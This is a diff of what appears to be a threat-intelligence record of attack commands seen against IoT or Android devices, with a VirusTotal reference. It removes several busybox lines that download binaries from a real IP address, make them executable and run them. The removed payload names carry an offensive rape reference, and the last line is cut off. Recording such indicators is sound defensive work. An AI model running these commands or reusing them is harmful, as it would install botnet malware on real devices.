@@ -33,15 +33,3 @@ https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa
 Commands/exploits observed :
 
 CMD: /bin/busybox wget;/bin/busybox echo -ne '\\x45\\x4c\\x46'
-
-
-busybox wget http://45.202.35.68/thefatperson/imgoingtofindanrapeuuu1; chmod 777 imgoingtofindanrapeuuu1; ./imgoingtofindanrapeuuu1 android
-busybox wget http://45.202.35.68/thefatperson/imgoingtofindanrapeuuu2; chmod 777 imgoingtofindanrapeuuu2; ./imgoingtofindanrapeuuu2 android
-busybox wget http://45.202.35.68/thefatperson/imgoingtofindanrapeuuu3; chmod 777 imgoingtofindanrapeuuu3; ./imgoingtofindanrapeuuu3 android
-busybox wget http://45.202.35.68/thefatperson/imgoingtofindanrapeuuu4; chmod 777 imgoingtofindanrapeuuu4; ./imgoingtofindanrapeuuu4 android
-busybox wget http://45.202.35.68/thefatperson/imgoingtofindanrapeuuu5; chmod 777 imgoingtofindanrapeuuu5; ./imgoingtofindanrapeuuu5 android
-busybox wget http://45.202.35.68/thefatperson/imgoingtofindanrapeuuu6; chmod 777 imgoingtofindanrapeuuu6; ./imgoingtofindanrapeuuu6 android
-busybox wget http://45.202.35.68/thefatperson/imgoingtofindanrapeuuu7; chmod 777 imgoingtofindanrapeuuu7; ./imgoingtofindanrapeuuu7 android
-busybox wget http://45.202.35.68/thefatperson/imgoingtofindanrapeuuu8; chmod 777 imgoingtofindanrapeuuu8; ./imgoingtofindanrapeuuu8 android
-busybox wget http://45.202.35.68/thefatperson/imgoingtofi
-
